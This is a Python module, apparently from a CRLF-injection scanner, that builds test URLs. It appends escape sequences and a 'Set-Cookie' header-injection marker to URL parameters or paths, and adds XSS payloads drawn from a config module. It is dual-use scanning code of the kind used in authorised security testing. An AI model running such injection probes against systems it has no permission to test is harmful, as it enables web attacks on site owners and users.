# -*- coding: utf-8 -*-

import re
from crlfsuite.core.config import xss_payloads, escape_chars, starting_strings
from crlfsuite.utils.inject import inject

def generate(url):
    """
    Adds payload to the URL and returns a set of parsed URLs
    """
    injection = "Set-Cookie:nefcore=crlfsuite;"
    parsed_urls = set()
    verify_param = re.compile(r'=[^?\|&]*')
    is_param = verify_param.search(url)
    if is_param:
        del starting_strings[2]
        for string in starting_strings:
            for each_escape in escape_chars:
                injected_urls = inject(url, string+each_escape+injection)
                for each_injected_url in injected_urls:
                    parsed_urls.add(each_injected_url)
        
        for payload in xss_payloads:
            _injected = inject(url, payload)
            for injected in _injected:
                parsed_urls.add(injected)
    else:
        if not url.endswith('/'):
            url = url+'/'
        else:
            None
        for string in starting_strings:
            for each_escape in escape_chars:
                parsed_urls.add(url+string+each_escape+injection)
        for payload in xss_payloads:
            parsed_urls.add(url+payload)    
    total_len = len(parsed_urls)

    return parsed_urls, total_len